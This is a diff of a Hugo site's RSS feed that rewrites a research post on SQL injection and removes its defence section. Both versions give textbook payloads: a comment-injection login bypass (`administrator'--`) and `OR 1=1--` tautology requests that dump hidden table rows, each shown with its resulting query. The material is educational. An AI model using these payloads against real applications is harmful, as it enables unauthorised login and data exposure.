@@ -8,23 +8,17 @@
       <language>en-us</language>
       <lastBuildDate>Thu, 27 Nov 2025 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/tags/databases/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>Research: SQL Injection Patterns</title>
+      <title>Research: Boolean &amp; Logic-Based SQL Injection</title>
       <link>http://localhost:1313/research/sql-injection-patterns/</link>
       <pubDate>Thu, 27 Nov 2025 00:00:00 +0000</pubDate>
 
       <guid>http://localhost:1313/research/sql-injection-patterns/</guid>
-      <description>&lt;h2 id=&#34;abstract&#34;&gt;
-  Abstract
-  &lt;a href=&#34;#abstract&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
+      <description>&lt;h2 id=&#34;1-authentication-bypass-via-comment-injection&#34;&gt;
+  1. Authentication Bypass via Comment Injection
+  &lt;a href=&#34;#1-authentication-bypass-via-comment-injection&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
 &lt;/h2&gt;
-&lt;p&gt;SQL Injection (SQLi) occurs when user input interferes with the structure of a backend database query. This report covers two specific impact scenarios: Authentication Bypass and Hidden Data Retrieval.&lt;/p&gt;
-
-&lt;h2 id=&#34;1-authentication-bypass-login-logic&#34;&gt;
-  1. Authentication Bypass (Login Logic)
-  &lt;a href=&#34;#1-authentication-bypass-login-logic&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
-&lt;/h2&gt;
-&lt;p&gt;Authentication mechanisms often check credentials using a simple &lt;code&gt;WHERE&lt;/code&gt; clause.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Vulnerable Query:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Login mechanisms frequently construct queries by concatenating user input directly into a string.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Backend Logic:&lt;/strong&gt;&lt;/p&gt;
 
 &lt;div class=&#34;highlight-wrapper&#34;&gt;
   &lt;div class=&#34;highlight-toolbar&#34;&gt;
@@ -36,34 +30,8 @@
 
     &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
   &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; users &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; username &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$user&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$pass&amp;#39;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;strong&gt;The Bypass:&lt;/strong&gt;
-By injecting a comment character (&lt;code&gt;--&lt;/code&gt; for PostgreSQL/SQLite, &lt;code&gt;#&lt;/code&gt; for MySQL), we can truncate the query, removing the password check entirely.&lt;/p&gt;</description>
-      <content>
-&lt;h2 id=&#34;abstract&#34;&gt;
-  Abstract
-  &lt;a href=&#34;#abstract&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
-&lt;/h2&gt;
-&lt;p&gt;SQL Injection (SQLi) occurs when user input interferes with the structure of a backend database query. This report covers two specific impact scenarios: Authentication Bypass and Hidden Data Retrieval.&lt;/p&gt;
-
-&lt;h2 id=&#34;1-authentication-bypass-login-logic&#34;&gt;
-  1. Authentication Bypass (Login Logic)
-  &lt;a href=&#34;#1-authentication-bypass-login-logic&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
-&lt;/h2&gt;
-&lt;p&gt;Authentication mechanisms often check credentials using a simple &lt;code&gt;WHERE&lt;/code&gt; clause.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Vulnerable Query:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&#34;highlight-wrapper&#34;&gt;
-  &lt;div class=&#34;highlight-toolbar&#34;&gt;
-    &lt;span class=&#34;item&#34;&gt;
-      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
-      &lt;span class=&#34;name&#34;&gt;sql&lt;/span&gt;
-    &lt;/span&gt;
-
-
-    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
-  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; users &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; username &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$user&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$pass&amp;#39;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;strong&gt;The Bypass:&lt;/strong&gt;
-By injecting a comment character (&lt;code&gt;--&lt;/code&gt; for PostgreSQL/SQLite, &lt;code&gt;#&lt;/code&gt; for MySQL), we can truncate the query, removing the password check entirely.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Injection Vector:&lt;/strong&gt;
+By appending the SQL comment sequence (&lt;code&gt;--&lt;/code&gt;), we can truncate the query immediately after the username, effectively removing the password validation requirement.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;administrator&#39;--&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Resulting Query:&lt;/strong&gt;&lt;/p&gt;
 
@@ -77,14 +45,14 @@ By injecting a comment character (&lt;code&gt;--&lt;/code&gt; for PostgreSQL/SQL
 
     &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
   &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; users &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; username &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--&amp;#39; AND password = &amp;#39;...&amp;#39;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;The database interprets this as &amp;ldquo;Select the user administrator&amp;rdquo; and ignores the rest.&lt;/p&gt;
-
-&lt;h2 id=&#34;2-retrieving-hidden-data-boolean-logic&#34;&gt;
-  2. Retrieving Hidden Data (Boolean Logic)
-  &lt;a href=&#34;#2-retrieving-hidden-data-boolean-logic&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
+&lt;p&gt;The database engine interprets this as a valid query for the user &amp;ldquo;administrator&amp;rdquo;, ignoring the remainder of the string.&lt;/p&gt;</description>
+      <content>
+&lt;h2 id=&#34;1-authentication-bypass-via-comment-injection&#34;&gt;
+  1. Authentication Bypass via Comment Injection
+  &lt;a href=&#34;#1-authentication-bypass-via-comment-injection&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
 &lt;/h2&gt;
-&lt;p&gt;Applications often filter results based on a &amp;ldquo;published&amp;rdquo; flag.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Vulnerable Query:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Login mechanisms frequently construct queries by concatenating user input directly into a string.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Backend Logic:&lt;/strong&gt;&lt;/p&gt;
 
 &lt;div class=&#34;highlight-wrapper&#34;&gt;
   &lt;div class=&#34;highlight-toolbar&#34;&gt;
@@ -95,10 +63,10 @@ By injecting a comment character (&lt;code&gt;--&lt;/code&gt; for PostgreSQL/SQL
 
 
     &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
-  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; products &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; category &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Gifts&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; released &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;strong&gt;The Attack:&lt;/strong&gt;
-We can inject a tautology (a statement that is always true) to force the database to return all rows, regardless of the &lt;code&gt;released&lt;/code&gt; status.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;Gifts&#39; OR 1=1--&lt;/code&gt;&lt;/p&gt;
+  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; users &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; username &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$user&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$pass&amp;#39;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;Injection Vector:&lt;/strong&gt;
+By appending the SQL comment sequence (&lt;code&gt;--&lt;/code&gt;), we can truncate the query immediately after the username, effectively removing the password validation requirement.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;administrator&#39;--&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Resulting Query:&lt;/strong&gt;&lt;/p&gt;
 
 &lt;div class=&#34;highlight-wrapper&#34;&gt;
@@ -110,25 +78,63 @@ We can inject a tautology (a statement that is always true) to force the databas
 
 
     &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
-  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; products &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; category &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Gifts&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;OR&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--&amp;#39; AND released = 1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Since &lt;code&gt;1=1&lt;/code&gt; is always true, the database returns every product in the table, exposing unreleased or hidden items.&lt;/p&gt;
+  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; users &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; username &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--&amp;#39; AND password = &amp;#39;...&amp;#39;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The database engine interprets this as a valid query for the user &amp;ldquo;administrator&amp;rdquo;, ignoring the remainder of the string.&lt;/p&gt;
 
-  &lt;figure class=&#34;left&#34;&gt;
-    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240719185908.png&#34;   /&gt;
-      &lt;figcaption class=&#34;center&#34; &gt;
-        Using Boolean injection to retrieve hidden product categories
-      &lt;/figcaption&gt;
-  &lt;/figure&gt;
-
-
-&lt;h2 id=&#34;defense-strategy&#34;&gt;
-  Defense Strategy
-  &lt;a href=&#34;#defense-strategy&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
+&lt;h2 id=&#34;2-boolean-inference-hidden-data-retrieval&#34;&gt;
+  2. Boolean Inference (Hidden Data Retrieval)
+  &lt;a href=&#34;#2-boolean-inference-hidden-data-retrieval&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
 &lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;Prepared Statements (Parameterized Queries):&lt;/strong&gt; The only robust defense. Ensure the database treats user input as data, not executable code.&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Input Validation:&lt;/strong&gt; Strictly validate expected data types (e.g., ensure category IDs are integers).&lt;/li&gt;
-&lt;/ul&gt;
+&lt;p&gt;Applications often use hidden flags (e.g., &lt;code&gt;released = 1&lt;/code&gt;) to filter content. We can override these filters using Boolean tautologies.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Target Request:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&#34;highlight-wrapper&#34;&gt;
+  &lt;div class=&#34;highlight-toolbar&#34;&gt;
+    &lt;span class=&#34;item&#34;&gt;
+      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
+      &lt;span class=&#34;name&#34;&gt;http&lt;/span&gt;
+    &lt;/span&gt;
+
+
+    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
+  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;GET&lt;/span&gt; /filter?category=Pets &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;Backend Query:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&#34;highlight-wrapper&#34;&gt;
+  &lt;div class=&#34;highlight-toolbar&#34;&gt;
+    &lt;span class=&#34;item&#34;&gt;
+      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
+      &lt;span class=&#34;name&#34;&gt;sql&lt;/span&gt;
+    &lt;/span&gt;
+
+
+    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
+  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; products &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; category &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Pets&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; released &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;Injection Payload:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&#34;highlight-wrapper&#34;&gt;
+  &lt;div class=&#34;highlight-toolbar&#34;&gt;
+    &lt;span class=&#34;item&#34;&gt;
+      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
+      &lt;span class=&#34;name&#34;&gt;http&lt;/span&gt;
+    &lt;/span&gt;
+
+
+    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
+  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;GET&lt;/span&gt; /filter?category=Pets&amp;#39;+OR+1=1--&amp;#39; &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;Execution Logic:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&#34;highlight-wrapper&#34;&gt;
+  &lt;div class=&#34;highlight-toolbar&#34;&gt;
+    &lt;span class=&#34;item&#34;&gt;
+      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
+      &lt;span class=&#34;name&#34;&gt;sql&lt;/span&gt;
+    &lt;/span&gt;
+
+
+    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
+  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; products &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; category &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Pets&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;OR&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--&amp;#39; AND released = 1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Since &lt;code&gt;1=1&lt;/code&gt; evaluates to TRUE for every row in the table, the database returns the entire dataset, including unreleased or internal items. This technique effectively dumps the table without requiring a UNION attack.&lt;/p&gt;
 </content>
     </item>
   </channel>
